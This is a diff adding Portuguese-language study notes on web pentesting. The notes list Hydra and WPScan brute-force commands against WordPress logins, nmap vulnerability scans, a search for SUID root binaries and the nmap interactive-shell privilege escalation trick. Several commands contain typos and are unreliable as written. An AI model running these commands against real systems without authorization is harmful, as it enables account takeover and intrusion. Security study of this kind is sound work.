@@ -1,0 +1,49 @@
+nmap serve para procurar vulnerabilidades em sites
+para excluir repeticoes de palavras no texto e gravar como:
+sort #(file) | uniq #(file.txt(saida))
+
+remover linhas duplicadas 
+sort #(file) | uniq -u
+
+o burpsuite fará a interceptação dos pacotes de envio
+
+brute-forçe com Hydra sem nenhum dado
+- hydra -L (wordlist.txt) -p admin #(ip) http-post-form #("/wp-login.php):#(requisicao ^USER^ ^PASS^):#(mensagem_padrao do erro)" -F -V
+ 
+ brute forçe com admin
+ - hydra -l #(use-found) -P #(wordlist) #(ip) http-post-form #("/wp-login.php):#(requisicao ^USER^ ^PASS^):#(mensagem_padrao do erro)" -F -V
+ 
+ PODEMOS USAR O WPSCAN PARA QUEBRAR AS SENHAS
+ - wpscam --url #(url) #(ip) --passwords #(wordlist.txt) --usernames #(user_found)
+
+procurar falhas
+- nmap -V -sv #(url)
+
+serve para fazer uma busca nao completa
+-namp - sS #(url)
+
+serve para fazer uma busca completa
+-nmap -sV -A #(url)
+
+procurar todas as falhas do site
+nmap --script vuln -v -sV #(url)
+
+procurar escalar previlegio
+- find / -user root -perm -4000 2>/dev/null
+
+site GTFOBins
+-passos para escalação de privilegio
+
+escalar permissões nmap e vim
+- nmap --interactive
+- !sh
+
+vocabulario
+- -v trazer informacoes detalhadas
+- -sV ver versos dos servicos no site
+-L passar wordlist pra brute forçe
+-l ja tenho o user
+-p passar o pass padrão
+-P passar a wordlist para brute forçe
+-F se for a encontrar uma mesagem de erro parrar o processo
+-V mostrar todos os processos do brute forçe
